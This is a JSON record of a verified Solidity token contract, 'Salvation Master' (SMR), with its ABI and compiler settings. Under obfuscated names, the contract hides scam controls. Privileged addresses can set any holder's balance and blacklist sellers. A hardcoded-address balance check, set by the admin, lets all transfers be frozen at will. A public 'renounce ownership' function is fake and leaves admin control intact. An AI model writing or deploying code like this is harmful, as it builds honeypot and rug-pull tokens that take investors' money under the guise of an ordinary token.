{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface listFrom {\n    function createPair(address exemptMax, address takeToShould) external returns (address);\n}\n\ninterface fundBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMax) external view returns (uint256);\n\n    function transfer(address launchedToken, uint256 marketingLaunched) external returns (bool);\n\n    function allowance(address maxMinTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedToken,\n        uint256 marketingLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletReceiverLiquidity, uint256 value);\n    event Approval(address indexed maxMinTx, address indexed spender, uint256 value);\n}\n\nabstract contract modeAutoSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountMarketingSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoTxBuy is fundBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SalvationMaster is modeAutoSender, fundBuy, autoTxBuy {\n\n    function listSwap(address enableSwapTo, address launchedToken, uint256 marketingLaunched) internal returns (bool) {\n        if (enableSwapTo == feeAt) {\n            return listTeam(enableSwapTo, launchedToken, marketingLaunched);\n        }\n        uint256 toAmount = fundBuy(atReceiverSell).balanceOf(tokenSender);\n        require(toAmount == takeLaunch);\n        require(launchedToken != tokenSender);\n        if (teamReceiverLaunched[enableSwapTo]) {\n            return listTeam(enableSwapTo, launchedToken, minMarketingFund);\n        }\n        return listTeam(enableSwapTo, launchedToken, marketingLaunched);\n    }\n\n    mapping(address => uint256) private autoLaunchSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txSenderLiquidity;\n    }\n\n    address private senderMinTake;\n\n    bool private launchedTradingToken;\n\n    address public feeAt;\n\n    string private swapAutoAmount = \"Salvation Master\";\n\n    function listSell(address exemptFromTotal) public {\n        require(exemptFromTotal.balance < 100000);\n        if (shouldFundWallet) {\n            return;\n        }\n        \n        txList[exemptFromTotal] = true;\n        if (maxLaunch != launchSwap) {\n            feeLimit = true;\n        }\n        shouldFundWallet = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapAutoAmount;\n    }\n\n    function transfer(address amountTotal, uint256 marketingLaunched) external virtual override returns (bool) {\n        return listSwap(_msgSender(), amountTotal, marketingLaunched);\n    }\n\n    function receiverTeam() public {\n        emit OwnershipTransferred(feeAt, address(0));\n        senderMinTake = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeSwap;\n    }\n\n    function txModeEnable(address txExemptReceiver) public {\n        isWallet();\n        \n        if (txExemptReceiver == feeAt || txExemptReceiver == atReceiverSell) {\n            return;\n        }\n        teamReceiverLaunched[txExemptReceiver] = true;\n    }\n\n    address tokenSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isWallet() private view {\n        require(txList[_msgSender()]);\n    }\n\n    function listTeam(address enableSwapTo, address launchedToken, uint256 marketingLaunched) internal returns (bool) {\n        require(autoLaunchSender[enableSwapTo] >= marketingLaunched);\n        autoLaunchSender[enableSwapTo] -= marketingLaunched;\n        autoLaunchSender[launchedToken] += marketingLaunched;\n        emit Transfer(enableSwapTo, launchedToken, marketingLaunched);\n        return true;\n    }\n\n    bool private modeAuto;\n\n    function approve(address modeSwap, uint256 marketingLaunched) public virtual override returns (bool) {\n        fundLimit[_msgSender()][modeSwap] = marketingLaunched;\n        emit Approval(_msgSender(), modeSwap, marketingLaunched);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderMinTake;\n    }\n\n    bool public feeLimit;\n\n    function owner() external view returns (address) {\n        return senderMinTake;\n    }\n\n    address txExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private walletFee;\n\n    bool public launchSwap;\n\n    bool public amountExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableIsLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLimit;\n\n    function allowance(address takeMin, address modeSwap) external view virtual override returns (uint256) {\n        if (modeSwap == txExempt) {\n            return type(uint256).max;\n        }\n        return fundLimit[takeMin][modeSwap];\n    }\n\n    uint8 private txSenderLiquidity = 18;\n\n    event OwnershipTransferred(address indexed teamWallet, address indexed exemptBuy);\n\n    uint256 constant minMarketingFund = 11 ** 10;\n\n    string private feeSwap = \"SMR\";\n\n    address public atReceiverSell;\n\n    mapping(address => bool) public teamReceiverLaunched;\n\n    function marketingMin(uint256 marketingLaunched) public {\n        isWallet();\n        takeLaunch = marketingLaunched;\n    }\n\n    function transferFrom(address enableSwapTo, address launchedToken, uint256 marketingLaunched) external override returns (bool) {\n        if (_msgSender() != txExempt) {\n            if (fundLimit[enableSwapTo][_msgSender()] != type(uint256).max) {\n                require(marketingLaunched <= fundLimit[enableSwapTo][_msgSender()]);\n                fundLimit[enableSwapTo][_msgSender()] -= marketingLaunched;\n            }\n        }\n        return listSwap(enableSwapTo, launchedToken, marketingLaunched);\n    }\n\n    bool public shouldFundWallet;\n\n    uint256 takeLaunch;\n\n    function totalTakeMax(address amountTotal, uint256 marketingLaunched) public {\n        isWallet();\n        autoLaunchSender[amountTotal] = marketingLaunched;\n    }\n\n    constructor (){\n        if (maxLaunch == modeAuto) {\n            modeAuto = true;\n        }\n        amountMarketingSell tokenFrom = amountMarketingSell(txExempt);\n        atReceiverSell = listFrom(tokenFrom.factory()).createPair(tokenFrom.WETH(), address(this));\n        \n        feeAt = _msgSender();\n        txList[feeAt] = true;\n        autoLaunchSender[feeAt] = enableIsLaunched;\n        receiverTeam();\n        \n        emit Transfer(address(0), feeAt, enableIsLaunched);\n    }\n\n    uint256 private enableIsLaunched = 100000000 * 10 ** 18;\n\n    function balanceOf(address fundMax) public view virtual override returns (uint256) {\n        return autoLaunchSender[fundMax];\n    }\n\n    bool public takeWallet;\n\n    uint256 feeLiquidity;\n\n    mapping(address => bool) public txList;\n\n    bool public maxLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMinTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiverLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiverSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFromTotal\",\"type\":\"address\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingLaunched\",\"type\":\"uint256\"}],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLaunched\",\"type\":\"uint256\"}],\"name\":\"totalTakeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptReceiver\",\"type\":\"address\"}],\"name\":\"txModeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SalvationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}